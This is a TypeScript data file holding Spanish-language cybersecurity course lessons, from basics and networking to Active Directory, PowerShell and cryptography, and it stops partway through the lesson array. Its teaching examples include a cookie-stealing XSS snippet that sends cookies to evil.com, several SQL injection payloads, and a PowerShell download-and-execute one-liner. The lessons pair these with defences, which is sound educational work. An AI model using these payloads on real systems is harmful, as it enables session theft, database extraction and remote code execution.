import type { Lesson } from "./types";

// Lecciones extendidas. Cada una pertenece a un módulo (sub: "MX") y se puede
// renderizar con renderMarkdown() en lib/securities/cybersec/markdown.ts.
// Cobertura: M1-M24 + M51, M53, M54, M55.
export const LESSONS: Lesson[] = [
  {
    id: 1,
    title: "¿Qué es la Ciberseguridad?",
    sub: "M1",
    dur: "25m",
    diff: "Básico",
    sections: [
      { h: "Definición", c: "La **ciberseguridad** protege sistemas, redes y datos contra ataques digitales. Combina:\n• **Tecnología** — Herramientas y software\n• **Procesos** — Políticas y frameworks\n• **Personas** — Capacitación y cultura\n\nNo es solo hackear: incluye defensa, detección, respuesta, recuperación y compliance." },
      { h: "Ramas del Campo", c: "🔴 **Red Team** — Simulan ataques (pentesting, exploits)\n🔵 **Blue Team** — Defienden (monitoreo, SIEM, IR)\n🟣 **Purple Team** — Combinan ambos\n🟢 **GRC** — Riesgo y compliance (GDPR, HIPAA)\n🔶 **Cloud Security** — AWS, Azure, GCP\n🛡️ **Forense Digital** — Investigación post-incidente\n🔧 **DevSecOps** — Seguridad en desarrollo\n📱 **Mobile/IoT Security** — Dispositivos conectados" },
      { h: "Historia y Evolución", c: "📅 **1971** Creeper (primer virus) → **1988** Morris Worm → **2000** ILOVEYOU → **2010** Stuxnet → **2013** Snowden/NSA → **2014** Heartbleed → **2017** WannaCry (230K equipos, 150 países) → **2020** SolarWinds → **2021** Colonial Pipeline + Log4Shell → **2023** MOVEit → **2024-25** Ataques con IA/deepfakes" },
      { h: "Cyber Kill Chain", c: "Lockheed Martin definió 7 fases de un ciberataque:\n\n1️⃣ **Reconnaissance** — Investigar al objetivo\n2️⃣ **Weaponization** — Crear el exploit/payload\n3️⃣ **Delivery** — Enviar al objetivo (email, web, USB)\n4️⃣ **Exploitation** — Ejecutar la vulnerabilidad\n5️⃣ **Installation** — Instalar malware/backdoor\n6️⃣ **C2** — Establecer canal de comando y control\n7️⃣ **Actions** — Cumplir objetivo (robo, destrucción)\n\nCada fase es una oportunidad para defender." },
    ],
  },
  {
    id: 2,
    title: "Tríada CIA y Principios",
    sub: "M2",
    dur: "30m",
    diff: "Básico",
    sections: [
      { h: "Tríada CIA", c: "🔒 **Confidencialidad** — Solo autorizados acceden. Cifrado, ACL, clasificación.\n🛡️ **Integridad** — Datos no alterados. Hashing, firmas digitales.\n⚡ **Disponibilidad** — Accesible cuando se necesita. Redundancia, backups, CDN." },
      { h: "Modelo AAA + Zero Trust", c: "🔑 **Autenticación** — ¿Quién eres? (MFA: algo que sabes + tienes + eres)\n✅ **Autorización** — ¿Qué puedes hacer? (RBAC, menor privilegio)\n📋 **Auditoría** — ¿Qué hiciste? (Logs)\n\n**Zero Trust:** \"Never trust, always verify.\" No confiar en nada dentro ni fuera de la red. Verificar cada solicitud como si viniera de una red hostil." },
      { h: "Defensa en Profundidad", c: "Capas como una cebolla:\n**Perímetro** → Firewall, WAF\n**Red** → IDS/IPS, segmentación, VPN\n**Host** → EDR, antivirus, hardening\n**App** → Código seguro, validación\n**Datos** → Cifrado, DLP, backups\n**Personas** → Capacitación, políticas" },
    ],
  },
  {
    id: 3,
    title: "Amenazas y Malware",
    sub: "M3",
    dur: "35m",
    diff: "Básico-Intermedio",
    sections: [
      { h: "Actores Maliciosos", c: "🎭 **Black Hat** — Maliciosos\n🤍 **White Hat** — Éticos, con permiso\n🩶 **Grey Hat** — Sin permiso, sin dañar\n🏛️ **APT** — Gobiernos (APT28, Lazarus)\n📜 **Script Kiddies** — Usan tools sin entender\n🏢 **Insiders** — Acceso legítimo, abusado\n🕵️ **Crimen organizado** — RaaS model" },
      { h: "Categorías de Ataques", c: "**Red:** DDoS, MITM, DNS Spoofing, ARP Poisoning\n**App:** SQLi, XSS, CSRF, SSRF, Directory Traversal\n**Social:** Phishing, Spear Phishing, Vishing, Pretexting, Baiting, BEC\n**Supply Chain:** Comprometer proveedor (SolarWinds)\n**Physical:** Tailgating, dumpster diving, shoulder surfing" },
      { h: "Malware Completo", c: "🦠 **Virus** — Necesita ejecución del usuario\n🐛 **Gusano** — Se propaga solo (WannaCry)\n🐴 **Troyano** — Disfrazado de legítimo\n🔐 **Ransomware** — Cifra y pide rescate\n👁️ **Spyware** — Espía actividad\n⌨️ **Keylogger** — Registra teclas\n🤖 **Botnet** — Red de zombies para DDoS\n🚪 **Rootkit** — Se oculta profundamente\n💣 **Logic Bomb** — Se activa con condición\n🔗 **Fileless** — Solo en memoria, sin archivo en disco" },
      { h: "Glosario", c: "📌 **Vulnerabilidad** — Debilidad explotable\n📌 **Exploit** — Código que la aprovecha\n📌 **Payload** — Carga maliciosa\n📌 **Zero-day** — Sin parche conocido\n📌 **CVE** — Catálogo de vulnerabilidades\n📌 **CVSS** — Score de severidad (0-10)\n📌 **IoC** — Indicador de compromiso\n📌 **TTPs** — Tácticas/Técnicas/Procedimientos" },
    ],
  },
  {
    id: 4,
    title: "Frameworks y Estándares",
    sub: "M4",
    dur: "20m",
    diff: "Intermedio",
    sections: [
      { h: "NIST CSF", c: "1️⃣ **Identificar** — Assets, riesgos\n2️⃣ **Proteger** — Controles\n3️⃣ **Detectar** — Monitoreo\n4️⃣ **Responder** — IR\n5️⃣ **Recuperar** — Restore + lessons learned" },
      { h: "Estándares Clave", c: "📋 **ISO 27001** — SGSI certificable\n🔶 **OWASP** — Top 10 web vulns\n🏛️ **CIS Controls** — 18 controles prácticos\n📜 **PCI-DSS** — Tarjetas de crédito\n🏥 **HIPAA** — Salud (EE.UU.)\n🇪🇺 **GDPR** — Datos personales (Europa)\n🔒 **SOC 2** — SaaS security\n📊 **NIST 800-53** — Catálogo de controles" },
      { h: "Certificaciones", c: "🟢 **Inicial:** Security+, Network+, Google Cyber\n🟡 **Intermedio:** CEH, CySA+, Pentest+\n🔴 **Avanzado:** OSCP, CISSP, CISM, GPEN\n🎯 **Tu ruta:** Security+ → CySA+/CEH → OSCP" },
    ],
  },
  {
    id: 5,
    title: "Modelo OSI",
    sub: "M5",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Las 7 Capas", c: "**7-App:** HTTP, DNS, FTP → XSS, SQLi\n**6-Presentación:** SSL/TLS, JPEG → SSL stripping\n**5-Sesión:** NetBIOS, RPC → Session hijacking\n**4-Transporte:** TCP, UDP → SYN flood, port scan\n**3-Red:** IP, ICMP, IPSec → IP spoofing, MITM\n**2-Enlace:** Ethernet, ARP → ARP poisoning, MAC flood\n**1-Física:** Cables, WiFi → Wiretapping, jamming\n\nMnemotécnico: **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way" },
      { h: "Encapsulamiento", c: "Al enviar datos, cada capa agrega un header:\nDatos → **Segmento** (TCP) → **Paquete** (IP) → **Trama** (MAC) → **Bits**\n\nAl recibir: desencapsulamiento (proceso inverso).\n\nCrucial para: análisis con Wireshark, entender firewalls, y saber dónde actúa cada herramienta de seguridad." },
    ],
  },
  {
    id: 6,
    title: "TCP/IP y Protocolos",
    sub: "M6",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "TCP vs UDP", c: "**TCP** — Conexión con 3-way handshake (SYN→SYN-ACK→ACK). Fiable, ordenado, lento. HTTP, SSH, FTP.\n**UDP** — Sin conexión. Rápido, sin garantía. DNS, VoIP, gaming.\n\n**Ataques:** SYN Flood (TCP), UDP Flood, TCP Reset" },
      { h: "Protocolos y Puertos", c: "🔢 **20/21** FTP · **22** SSH · **23** Telnet (¡inseguro!) · **25** SMTP · **53** DNS · **80** HTTP · **110** POP3 · **143** IMAP · **443** HTTPS · **445** SMB · **3389** RDP · **3306** MySQL\n\nPuertos abiertos = superficie de ataque. Nmap los descubre, firewalls los filtran." },
      { h: "DNS en Profundidad", c: "Traduce nombres → IPs. Proceso: Resolver → Root → TLD → Authoritative.\n\n**Ataques:** DNS Spoofing/Poisoning, DNS Tunneling (exfiltrar datos), DNS Amplification (DDoS), Typosquatting" },
    ],
  },
  {
    id: 7,
    title: "Direccionamiento IP",
    sub: "M7",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "IPv4 y Subnetting", c: "32 bits: **192.168.1.100**\n\n**Privadas:** 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n**Especiales:** 127.0.0.1 (localhost), 0.0.0.0 (todas)\n\n**/24** = 256 IPs, 254 usables\n**/25** = 128 IPs, 126 usables\n**/26** = 64 IPs, 62 usables\n\nSubnetting = segmentar red = limitar alcance de ataques." },
      { h: "NAT, DHCP e IPv6", c: "**NAT:** IP privada → pública para Internet\n**DHCP:** Asigna IPs automáticamente (Discover→Offer→Request→Ack)\n**IPv6:** 128 bits, 340 undecillones de IPs, IPSec nativo\n\n**Ataques:** DHCP Starvation, Rogue DHCP, IPv6 tunneling bypass" },
    ],
  },
  {
    id: 8,
    title: "Wireshark",
    sub: "M8",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "Filtros Esenciales", c: "**Display:** http, dns, tcp.port==80, ip.addr==10.0.0.1, tcp.flags.syn==1, frame contains \"password\"\n**Combos:** http && ip.src==192.168.1.100\n**Detectar:** POST con credenciales, DNS tunneling (subdominios largos), Nmap scan (muchos SYN), ARP spoof (MAC cambiante)" },
      { h: "Herramientas Complementarias", c: "🔧 **tcpdump** — CLI capture en Linux\n🔧 **tshark** — Wireshark en terminal\n🔧 **NetworkMiner** — Forense de red\n🔧 **Zeek** — IDS basado en tráfico" },
    ],
  },
  {
    id: 9,
    title: "Python para CyberSec",
    sub: "M51",
    dur: "40m",
    diff: "Intermedio",
    sections: [
      { h: "¿Por qué Python?", c: "Python es EL lenguaje de ciberseguridad por:\n→ Sintaxis simple y legible\n→ Enorme ecosistema de librerías\n→ Prototipado rápido de herramientas\n→ Scripting y automatización\n→ Compatible con Scapy, Requests, PyCrypto, Impacket\n\n**Usado para:** pentesting, malware analysis, automatización, forense, web scraping, exploit development" },
      { h: "Fundamentos", c: "**Variables y tipos:**\nip = \"192.168.1.1\"\nport = 80\nhosts = [\"10.0.0.1\", \"10.0.0.2\"]\n\n**Funciones:**\ndef scan_port(ip, port):\n    # lógica aquí\n    return result\n\n**Loops y condicionales:**\nfor port in range(1, 1025):\n    if is_open(ip, port):\n        print(f\"Port {port} OPEN\")\n\n**Manejo de archivos:**\nwith open(\"log.txt\") as f:\n    for line in f:\n        if \"failed\" in line.lower():\n            print(line)" },
      { h: "Networking con Python", c: "**Socket scanner:**\nimport socket\ndef scan(ip, port):\n    s = socket.socket()\n    s.settimeout(1)\n    result = s.connect_ex((ip, port))\n    s.close()\n    return result == 0\n\n**HTTP requests:**\nimport requests\nr = requests.get(\"https://target.com\")\nprint(r.status_code, r.headers)\n\n**Scapy (packet crafting):**\nfrom scapy.all import *\npkt = IP(dst=\"target\")/TCP(dport=80,flags=\"S\")\nans = sr1(pkt, timeout=1)" },
      { h: "Librerías Clave", c: "📦 **scapy** — Manipulación de paquetes\n📦 **requests** — HTTP client\n📦 **paramiko** — SSH client\n📦 **pycryptodome** — Cifrado\n📦 **impacket** — Protocolos Windows (SMB, NTLM)\n📦 **beautifulsoup4** — Web scraping\n📦 **shodan** — API de Shodan\n📦 **python-nmap** — Interface de Nmap\n📦 **volatility3** — Forense de memoria\n📦 **yara-python** — Detección de malware" },
    ],
  },
  {
    id: 10,
    title: "JavaScript y Seguridad Web",
    sub: "M53",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "JS en Seguridad", c: "JavaScript es esencial para entender ataques web:\n→ **XSS:** inyectar JS malicioso en páginas\n→ **CSRF:** ejecutar acciones no deseadas\n→ **Clickjacking:** superposición invisible\n→ **DOM manipulation:** modificar página dinámicamente\n\nComo defensor, necesitas entender JS para:\n→ Auditar código frontend\n→ Implementar CSP correctamente\n→ Detectar scripts maliciosos" },
      { h: "Fundamentos", c: "**Variables y funciones:**\nlet target = \"https://victim.com\";\nconst payload = '<script>alert(\"XSS\")</script>';\n\nfunction testXSS(input) {\n  return input.replace(/</g, \"&lt;\");\n}\n\n**DOM manipulation:**\ndocument.cookie // leer cookies\ndocument.location = \"http://evil.com?c=\" + document.cookie\n\n**Fetch API:**\nfetch(\"/api/users\")\n  .then(r => r.json())\n  .then(data => console.log(data));" },
      { h: "XSS desde la Perspectiva del Atacante", c: "**Reflected XSS:**\nhttps://site.com/search?q=<script>alert(1)</script>\n\n**Stored XSS:**\nComentario: <img src=x onerror=alert(document.cookie)>\n\n**DOM XSS:**\ndocument.write(location.hash.substring(1))\n\n**Cookie stealing:**\n<script>\nnew Image().src=\"http://evil.com/steal?c=\"+document.cookie;\n</script>\n\n**Prevención:** CSP headers, input sanitization, HttpOnly cookies, output encoding" },
    ],
  },
  {
    id: 11,
    title: "SQL y Database Security",
    sub: "M54",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "SQL Fundamentals", c: "**Consultas básicas:**\nSELECT * FROM users WHERE role='admin';\nINSERT INTO logs (event, ip) VALUES ('login', '10.0.0.1');\nUPDATE users SET password='hash' WHERE id=1;\nDELETE FROM sessions WHERE expired=1;\n\n**JOINs:**\nSELECT u.name, r.role FROM users u\nJOIN roles r ON u.role_id = r.id;" },
      { h: "SQL Injection", c: "**Básico:** ' OR 1=1 --\n**UNION based:**\n' UNION SELECT username,password FROM users --\n**Error based:**\n' AND 1=CONVERT(int,(SELECT @@version)) --\n**Blind (boolean):**\n' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --\n**Time-based:**\n' AND IF(1=1, SLEEP(5), 0) --\n\n**Prevención:** Prepared statements, parameterized queries, WAF, input validation, least privilege en DB user" },
      { h: "Database Hardening", c: "🔒 Cambiar credenciales por defecto\n🔒 Deshabilitar funciones peligrosas (xp_cmdshell)\n🔒 Principio de menor privilegio en DB users\n🔒 Cifrar datos sensibles at rest y in transit\n🔒 Auditar queries y accesos\n🔒 Backups cifrados y testeados\n🔒 Actualizar y parchear regularmente\n🔒 Network segmentation (DB no expuesta a internet)" },
    ],
  },
  {
    id: 12,
    title: "C/C++ y Low-Level Security",
    sub: "M55",
    dur: "35m",
    diff: "Avanzado",
    sections: [
      { h: "¿Por qué C para Seguridad?", c: "C/C++ son esenciales para:\n→ **Reverse engineering** — Entender binarios compilados\n→ **Exploit development** — Buffer overflows, shellcode\n→ **Malware analysis** — La mayoría de malware es C/C++\n→ **Kernel/OS internals** — Linux y Windows son C\n→ **Entender vulnerabilidades de memoria** — Las más críticas\n\nNo necesitas ser experto, pero sí entender: punteros, memoria, stack/heap." },
      { h: "Memoria y Vulnerabilidades", c: "**Stack layout:**\n[buffer local][saved EBP][return address][parámetros]\n\n**Buffer Overflow:**\nchar buffer[64];\ngets(buffer); // ¡NO valida longitud!\n// Si escribes 80 bytes, sobrescribes return address\n\n**Tipos de vulnerabilidades:**\n→ Stack buffer overflow\n→ Heap overflow\n→ Use-after-free\n→ Format string\n→ Integer overflow\n→ Double free\n\n**Protecciones modernas:** ASLR, DEP/NX, Stack Canaries, PIE" },
      { h: "Contramedidas", c: "**ASLR** — Randomiza direcciones de memoria\n**DEP/NX** — No ejecutar datos en stack\n**Stack Canaries** — Detectar overflow antes de return\n**PIE** — Position Independent Executable\n**RELRO** — Protect GOT table\n\n**Bypass techniques (avanzado):**\n→ ROP chains (Return Oriented Programming)\n→ ret2libc\n→ Information leaks para bypassear ASLR\n→ Heap spraying" },
    ],
  },
  {
    id: 13,
    title: "Seguridad WiFi",
    sub: "M9",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Estándares de Seguridad", c: "📡 **WEP** (1999) — RC4 + IV de 24 bits. **Roto**: se crackea en minutos (IVs repetidos).\n🔐 **WPA** (2003) — TKIP, parche temporal sobre hardware WEP. Deprecado.\n🛡️ **WPA2** (2004) — AES-CCMP. Estándar por años. Vulnerable a KRACK y captura de handshake.\n🚀 **WPA3** (2018) — SAE (Dragonfly handshake), forward secrecy, protección offline brute-force, cifrado individualizado en redes abiertas (OWE).\n\nRegla: usá WPA3 si podés, WPA2-AES como mínimo. Nunca WEP/WPA/TKIP." },
      { h: "Ataques Comunes", c: "👿 **Evil Twin** — AP falso con el mismo SSID para capturar credenciales.\n📴 **Deauth** — Frames 802.11 de desautenticación (no cifrados) para tirar clientes → forzar reconexión.\n🤝 **Handshake capture** — Capturás el 4-way handshake (aircrack-ng) y crackeás offline con diccionario.\n🔑 **PMKID attack** — Captura sin cliente conectado (hcxdumptool + hashcat).\n📌 **WPS PIN** — Brute force del PIN de 8 dígitos con Reaver (por eso: desactivá WPS)." },
      { h: "KRACK y Protección", c: "💥 **KRACK** (2017) — Key Reinstallation Attack: reinstala una clave ya usada en el handshake de WPA2, permitiendo descifrar/inyectar. WPA3 lo soluciona; parcheá clientes igual.\n\n**Defensa empresarial:**\n→ **WPA3-Enterprise / 802.1X** con RADIUS (cada usuario su credencial, no PSK compartida)\n→ **WIDS/WIPS** — Detección de rogue APs y deauth\n→ **Client isolation** — Clientes no se ven entre sí\n→ SSIDs ocultos NO son seguridad (se descubren fácil)" },
    ],
  },
  {
    id: 14,
    title: "Linux: Fundamentos",
    sub: "M10",
    dur: "35m",
    diff: "Básico",
    sections: [
      { h: "Por qué Linux en Seguridad", c: "La mayoría de servidores, herramientas de pentesting y la infraestructura cloud corren Linux. Dominarlo es no-negociable.\n\n🐧 **Distros para seguridad:**\n→ **Kali Linux** — 600+ tools preinstaladas (pentesting)\n→ **Parrot OS** — Alternativa liviana a Kali\n→ **Ubuntu/Debian** — Servidores\n→ **Tails** — Anonimato (todo por Tor)" },
      { h: "Sistema de Archivos (FHS)", c: "Todo es un archivo. Jerarquía estándar:\n📁 **/** raíz · **/etc** config · **/var** logs y datos variables\n📁 **/home** usuarios · **/root** home del admin · **/tmp** temporal\n📁 **/bin /usr/bin** binarios · **/proc** procesos (virtual)\n📁 **/dev** dispositivos · **/mnt /media** montajes\n\n🔍 Archivos clave para seguridad: /etc/passwd, /etc/shadow (hashes), /var/log/auth.log (logins), /etc/sudoers." },
      { h: "Comandos Esenciales", c: "**Navegación:** ls -la, cd, pwd, find / -name '*.conf', locate\n**Archivos:** cat, less, grep, head, tail -f (logs en vivo)\n**Permisos:** chmod, chown, ls -l\n**Procesos:** ps aux, top, htop, kill, netstat -tulpn / ss -tulpn\n**Red:** ip a, ping, curl, wget, nc (netcat)\n**Usuarios:** whoami, id, sudo, su\n\n💡 Pipe + redirección: cat /var/log/auth.log | grep 'Failed password' | wc -l" },
    ],
  },
  {
    id: 15,
    title: "Bash Scripting",
    sub: "M11",
    dur: "40m",
    diff: "Intermedio",
    sections: [
      { h: "Fundamentos", c: "El shebang define el intérprete:\n#!/bin/bash\n\n**Variables:**\ntarget='10.0.0.1'\nports=(22 80 443)\n\n**Condicionales:**\nif [ -f /etc/passwd ]; then echo 'existe'; fi\n\n**Loops:**\nfor ip in 10.0.0.{1..254}; do ping -c1 -W1 $ip; done\nwhile read line; do echo $line; done < hosts.txt\n\n**Argumentos:** $1 $2 ... $@ (todos), $# (cantidad)" },
      { h: "grep, awk, sed", c: "🔎 **grep** — Buscar patrones: grep -rin 'password' /etc/\n✂️ **awk** — Procesar columnas: awk -F: '{print $1}' /etc/passwd (usuarios)\n🔧 **sed** — Editar streams: sed 's/foo/bar/g' file\n\n**Combo real — IPs que más fallaron login:**\ngrep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head" },
      { h: "Scripts de Seguridad", c: "**Ping sweep:**\nfor i in $(seq 1 254); do\n  ping -c1 -W1 10.0.0.$i &> /dev/null && echo 10.0.0.$i UP\ndone\n\n**Port scanner (con /dev/tcp):**\nfor p in 22 80 443 3389; do\n  (echo > /dev/tcp/$1/$p) 2>/dev/null && echo Port $p OPEN\ndone\n\n**Monitor de logins fallidos:**\ntail -f /var/log/auth.log | grep --line-buffered 'Failed password'" },
    ],
  },
  {
    id: 16,
    title: "Linux: Permisos y Hardening",
    sub: "M12",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Permisos rwx", c: "Cada archivo: dueño / grupo / otros, con r(4) w(2) x(1).\n\n**chmod numérico:** 755 = rwxr-xr-x · 644 = rw-r--r-- · 600 = solo dueño\n**chmod simbólico:** chmod u+x script.sh\n**chown:** chown user:group archivo\n\nls -l muestra: -rwxr-xr-x. El primer char: - archivo, d directorio, l symlink." },
      { h: "SUID, SGID y sudo", c: "⚠️ **SUID** (chmod 4755) — El binario corre con permisos del DUEÑO, no de quien lo ejecuta. Si es root y es explotable → escalada de privilegios.\n🔍 Encontrar SUID: find / -perm -4000 -type f 2>/dev/null\n📚 GTFOBins documenta binarios SUID abusables (vim, find, nmap viejo...).\n\n**sudo** — Permisos elevados puntuales. /etc/sudoers define quién puede qué. sudo -l lista lo permitido.\n**PAM** — Pluggable Authentication Modules: política de auth (longitud de password, lockout, MFA)." },
      { h: "Hardening Esencial", c: "✅ Deshabilitar root SSH (PermitRootLogin no) + usar claves, no passwords\n✅ Firewall (ufw/iptables) con default deny\n✅ Actualizar: apt update && apt upgrade\n✅ Eliminar servicios y paquetes innecesarios\n✅ fail2ban contra brute force\n✅ Auditd para logging de syscalls\n✅ **SELinux** (RHEL) / **AppArmor** (Debian/Ubuntu) — MAC: confinan procesos aunque sean comprometidos\n✅ **CIS Benchmarks** — checklist de hardening por OS, medible con herramientas (Lynis)" },
    ],
  },
  {
    id: 17,
    title: "Windows: Seguridad",
    sub: "M13",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Arquitectura y Registro", c: "🪟 Windows domina el endpoint corporativo → blanco principal.\n\n**Registro (regedit):** base de datos jerárquica de config. Hives clave:\n→ HKLM\\\\SYSTEM, HKLM\\\\SOFTWARE — sistema\n→ HKCU — usuario actual\n→ Persistencia de malware: ...\\\\Run, ...\\\\RunOnce\n\n**Servicios:** services.msc. Muchos corren como SYSTEM (máximo privilegio) → objetivo de explotación." },
      { h: "Event Viewer y Logs", c: "Los logs de Windows (Event Viewer / wevtutil) son la fuente para detección. **Event IDs críticos:**\n🔑 **4624** — Logon exitoso\n❌ **4625** — Logon fallido (brute force)\n🎫 **4648** — Logon con credenciales explícitas (lateral movement)\n👑 **4672** — Privilegios especiales asignados (admin logon)\n➕ **4720** — Cuenta de usuario creada (persistencia)\n⚙️ **7045** — Servicio nuevo instalado (PsExec, malware)\n\nCanales: Security, System, Application, PowerShell/Operational." },
      { h: "Defensas Nativas", c: "🛡️ **Windows Defender** — AV/EDR integrado\n🔬 **AMSI** (Antimalware Scan Interface) — Inspecciona scripts (PowerShell, JS, VBA) en memoria antes de ejecutar → los atacantes intentan bypassearlo\n📊 **ETW** (Event Tracing for Windows) — Telemetría profunda usada por EDRs\n📋 **GPO** (Group Policy) — Política centralizada en dominio: longitud de password, AppLocker, restricciones\n🔒 **Credential Guard, LSA Protection** — Protegen credenciales en memoria contra Mimikatz" },
    ],
  },
  {
    id: 18,
    title: "Active Directory",
    sub: "M14",
    dur: "45m",
    diff: "Avanzado",
    sections: [
      { h: "Fundamentos de AD", c: "Active Directory es el directorio que gestiona identidad y acceso en redes Windows corporativas. Comprometer el AD = comprometer la organización.\n\n🏛️ **Domain Controller (DC)** — Servidor que aloja AD\n🌳 **Forest > Domain > OU** — Jerarquía\n👤 **Objetos:** usuarios, grupos, computadoras\n📜 **GPO** — Políticas aplicadas por OU\n🔎 **LDAP** (389/636) — Protocolo de consulta del directorio" },
      { h: "Kerberos", c: "Protocolo de autenticación de AD (no manda passwords por la red):\n1️⃣ Cliente pide **TGT** al KDC (AS-REQ), cifrado con hash del usuario\n2️⃣ KDC devuelve TGT (cifrado con la clave de krbtgt)\n3️⃣ Cliente usa TGT para pedir un **TGS** (service ticket) para un servicio\n4️⃣ Presenta el TGS al servicio\n\nEl ticket prueba identidad sin reenviar la clave. Pero el diseño abre varios ataques..." },
      { h: "Ataques a AD", c: "🔥 **Kerberoasting** — Pedís TGS de cuentas de servicio (SPN) y crackeás su hash offline (password débil → game over)\n🎯 **AS-REP Roasting** — Cuentas sin preauth Kerberos → hash crackeable\n🪙 **Pass-the-Hash** — Reutilizás el hash NTLM sin conocer la password\n🩸 **DCSync** — Simulás ser un DC y pedís replicar hashes (Mimikatz)\n👑 **Golden Ticket** — Con el hash de krbtgt forjás TGTs válidos para cualquier usuario (persistencia total)\n\n**Defensa:** passwords largas en cuentas de servicio, gMSA, tiering, monitoreo de 4769, LAPS, ATA/Defender for Identity." },
    ],
  },
  {
    id: 19,
    title: "PowerShell para Seguridad",
    sub: "M15",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Fundamentos", c: "PowerShell es shell + lenguaje con acceso total a .NET y la API de Windows → arma de doble filo (admin y atacante).\n\n**Cmdlets** siguen Verbo-Sustantivo:\nGet-Process, Get-Service, Get-EventLog, Get-LocalUser\n\n**Pipeline con objetos** (no texto):\nGet-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending\n\n**Ejecución:** Get-Help, Get-Member (explora propiedades de un objeto)." },
      { h: "Scripts de Auditoría", c: "**Usuarios admin locales:**\nGet-LocalGroupMember -Group 'Administrators'\n\n**Servicios corriendo como SYSTEM:**\nGet-WmiObject Win32_Service | Where {$_.StartName -eq 'LocalSystem'} | Select Name,PathName\n\n**Archivos modificados en 24h:**\nGet-ChildItem C:\\\\ -Recurse | Where {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}\n\n**Logins fallidos:**\nGet-EventLog Security -InstanceId 4625 -Newest 20" },
      { h: "PowerShell Ofensivo y Defensa", c: "⚔️ **Ofensivo:** los atacantes lo aman por ser nativo (LOLBin) y correr en memoria:\n→ **PowerShell Empire / PowerSploit** — Post-explotación\n→ **AMSI bypass** + ofuscación para evadir Defender\n→ Descargar y ejecutar en memoria: IEX (New-Object Net.WebClient).DownloadString(...)\n\n🛡️ **Defensa:**\n→ **Script Block Logging** (4104) + **Module Logging** + transcription\n→ **Constrained Language Mode**\n→ **AppLocker / WDAC** para restringir ejecución\n→ Alertar sobre EncodedCommand y descargas en memoria" },
    ],
  },
  {
    id: 20,
    title: "Criptografía Simétrica",
    sub: "M16",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Concepto y Algoritmos", c: "🔐 **Simétrica** = la MISMA clave cifra y descifra. Muy rápida, ideal para grandes volúmenes. Problema: ¿cómo compartir la clave de forma segura? (lo resuelve la asimétrica).\n\n→ **AES** (128/192/256 bits) — Estándar actual, seguro, acelerado por hardware (AES-NI)\n→ **ChaCha20** — Alternativa rápida en software (móviles)\n→ **DES** — 56 bits, **roto** (brute force)\n→ **3DES** — Triple DES, lento y deprecado" },
      { h: "Modos de Operación", c: "El cifrado por bloques necesita un MODO:\n🚫 **ECB** — Cada bloque igual → mismo cifrado. **Inseguro** (el pingüino cifrado sigue viéndose).\n🔗 **CBC** — Encadena bloques con IV. Vulnerable a padding oracle si mal implementado.\n🔢 **CTR** — Convierte el cifrador en stream cipher.\n✅ **GCM** — AEAD: cifra **y** autentica (detecta manipulación). El recomendado hoy.\n\n⚠️ Nunca reutilices un nonce/IV con la misma clave (rompe GCM y CTR)." },
      { h: "Gestión de Claves", c: "El cifrado es tan fuerte como la protección de la clave:\n🔑 No hardcodear claves en código ni repos\n🔑 **KMS** (AWS/Azure/GCP) o **HSM** para almacenar y rotar\n🔑 Derivación: PBKDF2/Argon2 para derivar claves de passwords\n🔑 Rotación periódica + separación de funciones\n\n💡 En AlphaLog: los campos sensibles usan **AES-256-GCM** server-side con clave en variable de entorno." },
    ],
  },
  {
    id: 21,
    title: "Criptografía Asimétrica",
    sub: "M17",
    dur: "35m",
    diff: "Avanzado",
    sections: [
      { h: "Par de Claves", c: "🔓 **Asimétrica** = dos claves matemáticamente ligadas: **pública** (compartible) y **privada** (secreta).\n→ Cifrás con la **pública** → solo la **privada** descifra (confidencialidad)\n→ Firmás con la **privada** → la **pública** verifica (autenticidad)\n\n**Algoritmos:**\n→ **RSA** — Basado en factorización de números primos grandes (2048/4096 bits)\n→ **ECC** — Curvas elípticas: misma seguridad con claves mucho más cortas (256 bits ≈ RSA 3072)" },
      { h: "Diffie-Hellman y Firmas", c: "🤝 **Diffie-Hellman** — Permite a dos partes acordar una clave secreta compartida sobre un canal público sin transmitirla. Base del intercambio de claves en TLS. **ECDHE** agrega forward secrecy.\n\n✍️ **Firma digital:**\n1. Hash del mensaje\n2. Cifrar el hash con la clave privada = firma\n3. El receptor descifra con la pública y compara hashes\n\nProvee integridad + autenticación + **no repudio**." },
      { h: "Amenaza Cuántica", c: "⚛️ El **algoritmo de Shor** en una computadora cuántica suficientemente grande rompería RSA y ECC (factorización y logaritmo discreto dejan de ser difíciles).\n\n🛡️ **Criptografía post-cuántica (PQC):** NIST estandarizó algoritmos resistentes:\n→ **CRYSTALS-Kyber** (key encapsulation)\n→ **CRYSTALS-Dilithium** (firmas)\n\n**Harvest now, decrypt later:** atacantes guardan tráfico cifrado hoy para descifrarlo cuando haya cuántica → la migración a PQC ya empezó." },
    ],
  },
  {
    id: 22,
    title: "Hashing y PKI",
    sub: "M18",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "Funciones Hash", c: "#️⃣ Un **hash** transforma datos en un valor fijo, **unidireccional** (no se revierte). Propiedades: determinista, resistente a colisiones, efecto avalancha.\n\n→ **MD5 / SHA-1** — **Rotos** (colisiones demostradas), no usar para seguridad\n→ **SHA-256 / SHA-3** — Seguros para integridad\n\nUsos: verificar integridad de archivos, IoCs, firmas digitales." },
